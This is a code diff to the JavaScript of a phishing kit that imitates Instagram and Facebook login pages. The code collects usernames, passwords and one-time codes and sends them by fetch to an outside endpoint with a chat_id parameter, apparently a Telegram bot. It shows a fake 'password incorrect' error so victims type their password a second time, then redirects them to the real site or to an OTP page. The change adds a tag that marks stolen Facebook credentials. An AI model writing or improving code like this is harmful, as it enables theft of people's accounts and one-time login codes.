@@ -38,15 +38,15 @@ window.onload = () => {
     const errorHTML = `<div class="_ab2z">
       Sorry, your password was incorrect. Please double-check your password.
     </div>`;
-    const errorDiv = document.querySelector("#errorDiv")
+    const errorDiv = document.querySelector("#errorDiv");
     fetch(`${url}?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
       .then((res) => {
-        if(window.allowLogin || otp) {
-          location.assign(redirect)
+        if (window.allowLogin || otp) {
+          location.assign(redirect);
         } else {
-          e.target.reset()
-          errorDiv.innerHTML = errorHTML
-          window.allowLogin = true
+          e.target.reset();
+          errorDiv.innerHTML = errorHTML;
+          window.allowLogin = true;
         }
       })
       .catch((err) => console.log(err));
@@ -57,7 +57,10 @@ window.onload = () => {
       post(otp.value, e, "https://instagram.com");
     } else {
       post(
-        username.value + "\n" + password.value,
+        (username.classList.contains("isfb") ? "Facebook\n" : "") +
+          username.value +
+          "\n" +
+          password.value,
         e,
         // "https://instagram.com"
         "otp.html"
@@ -73,5 +76,5 @@ window.onload = () => {
   toggleBtn?.addEventListener("click", handleToggle);
   form1?.addEventListener("submit", onSubmit);
   form2?.addEventListener("submit", onSubmit);
-  redirect?.addEventListener("click", () => location.assign("fbmobile.html"))
+  redirect?.addEventListener("click", () => location.assign("fbmobile.html"));
 };
